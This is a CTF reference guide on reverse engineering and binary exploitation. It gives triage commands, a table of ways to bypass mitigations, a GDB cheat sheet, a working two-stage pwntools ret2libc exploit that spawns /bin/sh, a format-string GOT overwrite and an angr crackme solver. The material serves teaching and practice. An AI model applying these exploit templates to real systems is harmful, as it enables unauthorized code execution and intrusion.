# Reverse Engineering & PWN CTF Reference Guide

A comprehensive guide for analyzing compiled binaries, understanding protections, and building reliable exploits.

---

## 1. Binary Triage & Mitigation Checks

```bash
# 1. Architecture & Linking
file ./vuln
ldd ./vuln

# 2. Security Mitigations
checksec --file=./vuln
```

### Protection Matrix & Impact

| Mitigation | Meaning | Bypass / Exploitation Strategy |
| :--- | :--- | :--- |
| **NX / DEP** | No-eXecute stack | Return-Oriented Programming (ROP), `ret2libc`, JOP. |
| **Canary** | Stack smashing cookie | Leak canary via format string or buffer over-read; bruteforce in forking servers. |
| **PIE / PIC** | Position-Independent Executable | Leak code/ELF address to compute base address ($Address - Offset$). |
| **ASLR** | Address Space Layout Randomization | Leak libc/stack/heap pointer dynamically at runtime. |
| **RELRO** | Read-Only Relocations | **Partial:** GOT is writable (GOT overwrite attack). **Full:** GOT is read-only. |

---

## 2. GDB (`pwndbg` / `gef`) Cheat Sheet

```gdb
# Run with args or redirected input
gdb -q ./vuln
r < input.txt

# Cyclic pattern for finding buffer overflow offsets
cyclic 200
cyclic -l 0x61616161...  # Find offset from crash RIP/EIP value

# Inspect memory & mappings
vmmap                   # Display virtual memory maps and permissions
tele $rsp 20            # Telescope stack memory
got                     # Display Global Offset Table entries
heap                    # Inspect heap chunks (glibc malloc)
bins                    # Inspect tcache, fastbins, unsorted bins

# Breakpoints & Stepping
b *main+40
ni                      # Next instruction (step over)
si                      # Step instruction (step into)
```

---

## 3. PWN Attack Primitives

### 1. `ret2libc` (x86_64 Calling Convention)
In 64-bit Linux, function arguments are passed in registers: `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`.

```python
from pwn import *

elf = ELF("./vuln")
libc = ELF("./libc.so.6")
rop = ROP(elf)

# Leak puts() address via GOT
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # Stack alignment gadget (16-byte boundary)

payload1 = b"A" * OFFSET
payload1 += p64(pop_rdi) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.sym['main'])  # Loop back to main

io.sendline(payload1)
leaked_puts = u64(io.recvline().strip().ljust(8, b'\x00'))
libc_base = leaked_puts - libc.symbols['puts']
print(f"[+] Libc Base: {hex(libc_base)}")

# Second stage: system("/bin/sh")
system = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload2 = b"A" * OFFSET
payload2 += p64(ret)  # Align stack if needed
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(system)

io.sendline(payload2)
io.interactive()
```

### 2. Format String Vulnerabilities
- **Read from stack**: `%1$p`, `%2$p`, ..., `%n$s` (read string at pointer).
- **Arbitrary Write**:
  ```python
  from pwn import *
  # Overwrite GOT entry with target address at stack offset 6
  payload = fmtstr_payload(offset=6, writes={elf.got['puts']: elf.sym['win']})
  ```

---

## 4. Reverse Engineering Workflows

1. **Static Analysis**:
   - Decompile in **Ghidra** or **IDA Pro** (`F5` or `Tab`).
   - Identify entry point, `main()`, and string references (`Shift+F12` in IDA, Window -> Defined Strings in Ghidra).
   - Re-type variables and rename structs to simplify pseudocode.
2. **Dynamic Tracing**:
   - `ltrace ./bin` (trace library calls like `strcmp`, `strlen`, `malloc`).
   - `strace ./bin` (trace system calls like `read`, `write`, `open`).
3. **Symbolic Execution (Z3 / Angr)**:
   ```python
   import angr

   proj = angr.Project("./crackme", auto_load_libs=False)
   state = proj.factory.entry_state()
   simgr = proj.factory.simulation_manager(state)

   # Find address of "Access Granted" and avoid "Wrong Password"
   simgr.explore(find=0x401234, avoid=0x401256)
   if simgr.found:
       sol = simgr.found[0]
       print("[+] Input:", sol.posix.dumps(0))
   ```
